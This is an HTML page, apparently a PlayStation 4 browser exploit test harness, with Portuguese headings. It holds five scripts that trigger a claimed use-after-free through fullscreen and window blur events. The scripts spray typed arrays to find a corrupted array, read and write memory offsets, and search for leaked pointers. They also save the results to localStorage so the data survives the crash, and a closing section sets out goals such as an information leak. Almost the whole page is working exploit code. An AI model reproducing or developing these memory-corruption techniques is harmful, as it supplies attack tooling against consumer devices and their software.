<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Document.Write Exploitation</title>
</head>
<body>

<h1>PS4 UAF - Document.Write Crash Analysis</h1>

<h2>DESCOBERTA</h2>
<p style="color:red;font-weight:bold;">TESTE 8 (document.write + reload) CRASHOU!</p>
<p>Isso significa que o botão ATUALIZAR reescreve o documento!</p>
<p>Vamos explorar esse comportamento para extrair informações ou prevenir o crash</p>

<hr>

<h2>EXPLOIT 1: Capturar Estado PRÉ-CRASH</h2>
<p>Salva dados ANTES do document.write</p>
<button onclick="runExploit1()">EXECUTAR - Aperte OPTIONS</button>
<div id="result1"></div>

<script>
function runExploit1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h3>EXPLOIT 1: Pre-Crash State Capture</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF ativo</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO</h3>';
        
        // Capturar estado completo
        let crashState = {
            timestamp: Date.now(),
            corruptedValues: [],
            operations: []
        };
        
        // Ler todos os valores
        for(let i = 0; i < 64; i++) {
            try {
                const val = corrupted[i];
                const buf = new ArrayBuffer(8);
                const fview = new Float64Array(buf);
                const iview = new BigUint64Array(buf);
                fview[0] = val;
                crashState.corruptedValues.push({
                    offset: i,
                    hex: '0x' + iview[0].toString(16).padStart(16, '0')
                });
            } catch(e) {
                crashState.corruptedValues.push({offset: i, error: e.message});
            }
        }
        
        result.innerHTML += '<p>Capturados ' + crashState.corruptedValues.length + ' offsets</p>';
        
        // Executar operações de teste
        const tests = [
            () => { corrupted[2] = 0xAAAA; return corrupted[2]; },
            () => { for(let i=0; i<8; i++) corrupted[i]; return 'OK'; },
            () => { let x = new Float64Array(8); return x.length; }
        ];
        
        tests.forEach((test, idx) => {
            try {
                const res = test();
                crashState.operations.push({test: idx, result: 'SUCCESS: ' + res});
            } catch(e) {
                crashState.operations.push({test: idx, result: 'FAIL: ' + e.message});
            }
        });
        
        // Salvar em localStorage (persistente)
        try {
            localStorage.setItem('crash_state', JSON.stringify(crashState));
            result.innerHTML += '<p style="color:green;">Estado salvo em localStorage!</p>';
        } catch(e) {
            result.innerHTML += '<p>localStorage falhou: ' + e.message + '</p>';
        }
        
        result.innerHTML += '<p style="color:yellow;">document.write + crash em 3s...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:red;">EXECUTANDO document.write...</p>';
            document.open();
            document.write('<html><body><h1>Crash incoming...</h1></body></html>');
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 30000);
    };
}
</script>

<hr>

<h2>EXPLOIT 2: Prevenir Crash via Limpeza</h2>
<p>Tenta limpar TUDO antes do document.write</p>
<button onclick="runExploit2()">EXECUTAR - Aperte OPTIONS</button>
<div id="result2"></div>

<script>
function runExploit2() {
    const result = document.getElementById('result2');
    result.innerHTML = '<h3>EXPLOIT 2: Crash Prevention</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF ativo</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedIdx = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIdx = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Iniciando limpeza agressiva</h3>';
        
        setTimeout(() => {
            result.innerHTML += '<p>[1s] Zerando array corrompido...</p>';
            try {
                for(let i = 0; i < 8; i++) corrupted[i] = 0;
                result.innerHTML += '<p>Zerado</p>';
            } catch(e) {
                result.innerHTML += '<p>ERRO: ' + e.message + '</p>';
            }
        }, 1000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[2s] Removendo referências...</p>';
            controllers[corruptedIdx] = null;
            corrupted = null;
            controllers = null;
            spray = null;
            result.innerHTML += '<p>Referências removidas</p>';
        }, 2000);
        
        setTimeout(() => {
            result.innerHTML += '<p>[3s] Forçando GC...</p>';
            for(let i = 0; i < 1000; i++) {
                let trash = new Array(100);
            }
            result.innerHTML += '<p>GC forçado</p>';
        }, 3000);
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">[4s] LIMPEZA COMPLETA - Testando document.write...</p>';
            document.open();
            document.write('<html><body><h1>Test after cleanup</h1></body></html>');
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 4000);
    };
}
</script>

<hr>

<h2>EXPLOIT 3: Operações Durante document.write</h2>
<p>Executa operações NO MOMENTO do document.write</p>
<button onclick="runExploit3()">EXECUTAR - Aperte OPTIONS</button>
<div id="result3"></div>

<script>
function runExploit3() {
    const result = document.getElementById('result3');
    result.innerHTML = '<h3>EXPLOIT 3: Operations During Write</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF ativo</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                window.globalCorrupted = corrupted;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO</h3>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:red;">Iniciando document.write...</p>';
            
            // Interceptar document.write
            const originalWrite = document.write;
            const originalOpen = document.open;
            const originalClose = document.close;
            
            let interceptLog = [];
            
            document.open = function() {
                interceptLog.push('document.open() called');
                result.innerHTML += '<p>INTERCEPT: document.open()</p>';
                
                // Tentar ler array durante open
                try {
                    const val = window.globalCorrupted[0];
                    interceptLog.push('Array readable during open: ' + val);
                    result.innerHTML += '<p>Array OK durante open</p>';
                } catch(e) {
                    interceptLog.push('Array ERROR during open: ' + e.message);
                    result.innerHTML += '<p>Array ERRO: ' + e.message + '</p>';
                }
                
                return originalOpen.apply(this, arguments);
            };
            
            document.write = function(content) {
                interceptLog.push('document.write() called');
                result.innerHTML += '<p>INTERCEPT: document.write()</p>';
                
                // Tentar ler array durante write
                try {
                    const val = window.globalCorrupted[0];
                    interceptLog.push('Array readable during write: ' + val);
                    result.innerHTML += '<p>Array OK durante write</p>';
                } catch(e) {
                    interceptLog.push('Array ERROR during write: ' + e.message);
                    result.innerHTML += '<p>Array ERRO: ' + e.message + '</p>';
                }
                
                return originalWrite.apply(this, arguments);
            };
            
            document.close = function() {
                interceptLog.push('document.close() called');
                result.innerHTML += '<p>INTERCEPT: document.close()</p>';
                
                // Tentar ler array durante close
                try {
                    const val = window.globalCorrupted[0];
                    interceptLog.push('Array readable during close: ' + val);
                    result.innerHTML += '<p>Array OK durante close</p>';
                } catch(e) {
                    interceptLog.push('Array ERROR during close: ' + e.message);
                    result.innerHTML += '<p>Array ERRO: ' + e.message + '</p>';
                }
                
                return originalClose.apply(this, arguments);
            };
            
            // Executar document.write
            document.open();
            document.write('<html><body><h1>Intercepted write</h1></body></html>');
            document.close();
            
            result.innerHTML += '<h4>Log de Interceptação:</h4>';
            result.innerHTML += '<pre>' + interceptLog.join('\n') + '</pre>';
            
            setTimeout(() => location.reload(), 1000);
            
        }, 3000);
    };
}
</script>

<hr>

<h2>EXPLOIT 4: innerHTML vs document.write</h2>
<p>Testa se innerHTML também crasha</p>
<button onclick="runExploit4()">EXECUTAR - Aperte OPTIONS</button>
<div id="result4"></div>

<script>
function runExploit4() {
    const result = document.getElementById('result4');
    result.innerHTML = '<h3>EXPLOIT 4: innerHTML Test</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF ativo</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO</h3>';
        result.innerHTML += '<p>Testando innerHTML em 3s...</p>';
        
        setTimeout(() => {
            result.innerHTML += '<p style="color:yellow;">EXECUTANDO: document.body.innerHTML</p>';
            document.body.innerHTML = '<h1>New content via innerHTML</h1>';
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

<hr>

<h2>EXPLOIT 5: Operações Incrementais Pré-Crash</h2>
<p>Executa múltiplas operações antes do crash para máximo aproveitamento</p>
<button onclick="runExploit5()">EXECUTAR - Aperte OPTIONS</button>
<div id="result5"></div>

<script>
function runExploit5() {
    const result = document.getElementById('result5');
    result.innerHTML = '<h3>EXPLOIT 5: Maximum Operations Before Crash</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF ativo</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Executando operações máximas</h3>';
        
        let exploitData = {
            reads: [],
            writes: [],
            allocations: [],
            timestamp: Date.now()
        };
        
        // 1. Múltiplas leituras
        result.innerHTML += '<p>1. Lendo múltiplos offsets...</p>';
        for(let i = 0; i < 64; i++) {
            try {
                const val = corrupted[i];
                const buf = new ArrayBuffer(8);
                (new Float64Array(buf))[0] = val;
                const hex = (new BigUint64Array(buf))[0].toString(16);
                exploitData.reads.push({offset: i, value: '0x' + hex});
            } catch(e) {}
        }
        
        // 2. Múltiplas escritas
        result.innerHTML += '<p>2. Escrevendo padrões...</p>';
        const patterns = [0xAAAAn, 0xBBBBn, 0xCCCCn, 0xDDDDn, 0xEEEEn, 0xFFFFn];
        for(let i = 0; i < 6 && i < 8; i++) {
            try {
                const buf = new ArrayBuffer(8);
                (new BigUint64Array(buf))[0] = patterns[i];
                corrupted[i] = (new Float64Array(buf))[0];
                exploitData.writes.push({offset: i, pattern: '0x' + patterns[i].toString(16)});
            } catch(e) {}
        }
        
        // 3. Criar novos objetos
        result.innerHTML += '<p>3. Criando novos objetos...</p>';
        for(let i = 0; i < 100; i++) {
            try {
                let obj = {id: i, data: new Float64Array(8)};
                exploitData.allocations.push('Object ' + i);
            } catch(e) {}
        }
        
        // 4. Tentar vazar ponteiros
        result.innerHTML += '<p>4. Procurando por ponteiros...</p>';
        let foundPointers = [];
        for(let i = 0; i < 32; i++) {
            try {
                const val = corrupted[i];
                const buf = new ArrayBuffer(8);
                (new Float64Array(buf))[0] = val;
                const intVal = (new BigUint64Array(buf))[0];
                
                if (intVal > 0x100000n && intVal < 0x7fffffffffffn) {
                    foundPointers.push({offset: i, value: '0x' + intVal.toString(16)});
                }
            } catch(e) {}
        }
        exploitData.pointers = foundPointers;
        
        result.innerHTML += '<h4>Dados coletados:</h4>';
        result.innerHTML += '<p>Leituras: ' + exploitData.reads.length + '</p>';
        result.innerHTML += '<p>Escritas: ' + exploitData.writes.length + '</p>';
        result.innerHTML += '<p>Alocações: ' + exploitData.allocations.length + '</p>';
        result.innerHTML += '<p>Ponteiros possíveis: ' + foundPointers.length + '</p>';
        
        // Salvar
        try {
            localStorage.setItem('exploit_data', JSON.stringify(exploitData));
            result.innerHTML += '<p style="color:green;">Dados salvos em localStorage!</p>';
        } catch(e) {}
        
        result.innerHTML += '<p style="color:red;">Crash em 2s...</p>';
        
        setTimeout(() => {
            document.open();
            document.write('<html><body><h1>Crash</h1></body></html>');
            document.close();
            setTimeout(() => location.reload(), 500);
        }, 2000);
    };
}
</script>

<hr>

<h2>RECUPERAR DADOS SALVOS</h2>
<button onclick="showSavedData()">MOSTRAR DADOS SALVOS</button>
<div id="saved-data"></div>

<script>
function showSavedData() {
    const div = document.getElementById('saved-data');
    div.innerHTML = '<h3>Dados Recuperados de Crash Anterior</h3>';
    
    // Crash state
    const crashState = localStorage.getItem('crash_state');
    if (crashState) {
        div.innerHTML += '<h4>Crash State (Exploit 1):</h4>';
        div.innerHTML += '<pre>' + JSON.stringify(JSON.parse(crashState), null, 2) + '</pre>';
    }
    
    // Exploit data
    const exploitData = localStorage.getItem('exploit_data');
    if (exploitData) {
        div.innerHTML += '<h4>Exploit Data (Exploit 5):</h4>';
        const data = JSON.parse(exploitData);
        div.innerHTML += '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
        
        if (data.pointers && data.pointers.length > 0) {
            div.innerHTML += '<h4 style="color:red;">PONTEIROS ENCONTRADOS:</h4>';
            data.pointers.forEach(p => {
                div.innerHTML += '<p>Offset ' + p.offset + ': ' + p.value + '</p>';
            });
        }
    }
    
    if (!crashState && !exploitData) {
        div.innerHTML += '<p>Nenhum dado salvo. Execute Exploit 1 ou 5 primeiro.</p>';
    }
}
</script>

<hr>

<h2>ANÁLISE</h2>
<h3>O Que Descobrimos:</h3>
<p><b>FATO:</b> document.write() causa crash quando UAF está ativo</p>
<p><b>HIPÓTESE:</b> Botão ATUALIZAR usa document.write ou técnica similar</p>

<h3>Próximos Passos:</h3>
<ol>
<li><b>EXPLOIT 1:</b> Salva estado antes do crash → Execute e depois clique em MOSTRAR DADOS</li>
<li><b>EXPLOIT 2:</b> Testa se limpeza previne crash → Se prevenir, temos controle!</li>
<li><b>EXPLOIT 3:</b> Intercepta document.write → Mostra quando array se torna inacessível</li>
<li><b>EXPLOIT 4:</b> Testa innerHTML → Confirma se é específico de document.write</li>
<li><b>EXPLOIT 5:</b> Executa máximo de operações → Extrai máximo de dados antes do crash</li>
</ol>

<h3>Objetivos:</h3>
<ul>
<li>Se EXPLOIT 2 prevenir crash: Podemos controlar o teardown!</li>
<li>Se EXPLOIT 3 mostrar erro: Identificamos ponto exato do crash!</li>
<li>Se EXPLOIT 5 vazar ponteiros: Temos information leak!</li>
</ul>

</body>
</html>

